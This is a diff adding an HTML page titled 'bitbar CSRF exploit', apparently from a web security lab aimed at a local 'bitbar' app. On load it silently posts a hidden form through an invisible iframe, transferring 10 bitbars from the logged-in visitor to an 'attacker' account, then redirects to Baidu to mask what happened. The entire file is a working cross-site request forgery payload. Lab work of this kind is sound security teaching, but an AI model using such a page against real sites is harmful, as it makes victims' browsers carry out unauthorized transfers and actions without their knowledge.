@@ -1,0 +1,41 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>bitbar CSRF exploit</title>
+    <style>body{font-family:Arial,Helvetica,sans-serif;padding:2rem}</style>
+    <script>
+      // 单次提交的 CSRF 页面：创建隐藏 iframe，通过表单提交一次，然后重定向到百度
+      window.addEventListener('DOMContentLoaded', function(){
+        var iframe = document.createElement('iframe');
+        iframe.name = 'hidden_iframe_' + Math.random().toString(36).slice(2);
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+
+        var form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'http://localhost:3000/post_transfer';
+        form.target = iframe.name;
+
+        var dest = document.createElement('input');
+        dest.type = 'hidden'; dest.name = 'destination_username'; dest.value = 'attacker';
+        form.appendChild(dest);
+
+        var qty = document.createElement('input');
+        qty.type = 'hidden'; qty.name = 'quantity'; qty.value = '10';
+        form.appendChild(qty);
+
+        document.body.appendChild(form);
+        // 一次性提交
+        form.submit();
+
+        // 给服务器 1s 时间处理后重定向到百度
+        setTimeout(function(){ window.location.href = 'https://www.baidu.com'; }, 1000);
+      });
+    </script>
+  </head>
+  <body>
+    <h3>Performing transfer...</h3>
+    <p>This page will silently transfer 10 bitbars from the currently logged-in user to <strong>attacker</strong>, then redirect.</p>
+  </body>
+</html>
